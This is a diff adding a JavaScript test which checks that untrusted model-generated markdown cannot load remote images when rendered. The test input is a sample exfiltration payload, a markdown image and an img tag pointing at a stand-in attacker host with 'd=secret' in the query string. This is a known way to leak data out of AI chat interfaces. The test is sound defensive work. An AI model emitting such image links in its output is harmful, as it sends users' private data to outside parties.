@@ -38,6 +38,22 @@ describe("untrusted model markup cannot load remote resources on render", () => 
     expect(output.textContent).toContain("text");
   });
 
+  it("blocks a remote image before its node reaches the page document", () => {
+    const { window, document } = boot();
+    const adopt = document.adoptNode.bind(document);
+    const adopted = [];
+    // An <img> starts loading once it belongs to the page, even detached.
+    document.adoptNode = node => {
+      adopted.push(Boolean(node.querySelector?.('img[src*="evil.example"]')));
+      return adopt(node);
+    };
+    const output = document.createElement("div");
+    window.injectMarkdown(output, '![x](https://evil.example/p?d=secret) <img src="https://evil.example/a">', []);
+    expect(adopted.length).toBeGreaterThan(0);
+    expect(adopted.every(remote => !remote)).toBe(true);
+    expect(output.querySelector("img")).toBeNull();
+  });
+
   it("keeps ordinary links clickable", () => {
     const output = render("[Source](https://example.org/page)");
     expect(output.querySelector("a")?.getAttribute("href")).toBe("https://example.org/page");
